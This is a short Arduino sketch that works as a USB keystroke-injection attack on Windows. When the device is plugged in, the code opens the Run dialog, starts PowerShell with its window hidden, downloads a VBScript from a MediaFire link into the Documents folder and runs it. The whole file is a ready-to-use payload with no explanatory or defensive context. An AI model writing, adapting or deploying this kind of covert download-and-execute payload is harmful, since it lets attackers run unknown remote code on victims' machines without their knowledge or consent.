#include <Keyboard.h> 
void setup()
{
  Keyboard.begin();
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -windowstyle hidden");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cd Documents");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("Invoke-WebRequest -Uri ('http://download1080.mediafire.com/dpacx4os6eug/fuz3l2wdr0oz8dd/AnOnYmOuS.vbs') -O anon.vbs");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("./anon.vbs");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {}
